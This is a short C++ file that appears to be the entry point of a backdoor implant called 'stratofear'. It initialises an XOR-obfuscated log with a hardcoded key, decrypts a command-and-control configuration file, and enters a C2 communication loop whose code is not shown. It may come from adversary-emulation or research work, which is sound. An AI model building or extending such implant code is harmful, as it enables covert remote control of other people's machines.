#include <iostream>
#include <string>
#include <sstream>
#include "comms.hpp"
#include "core.hpp"
#include "XorLogger.hpp"
#include <unistd.h>


int main() {

    std::vector<unsigned char> key = { 0xC0, 0xFF, 0xEE, 0xEE };

    // Initialize logger in debug mode to enable plaintext stdout logging
    int init_result = XorLogger::InitializeLogger("sflog.log", key);
    if (init_result != 0) {
        std::cerr << "Failed to initialize logger. Error code: " << init_result << std::endl;
        return init_result;
    }
    
    // Load C2 configuration
    Configuration stratofearConfig = LoadConfig();
    if (stratofearConfig.configured){
        XorLogger::LogSuccess("Decrypted & pulled network configuration information from " + CONFIG_FILENAME + ".\n");
    }
    else{
        XorLogger::LogError(CONFIG_FILENAME + " network configuration file FAILED to load.\n");
        return 1;
    }

    Communication::C2CommsLoop(stratofearConfig);    
    return 0; 
}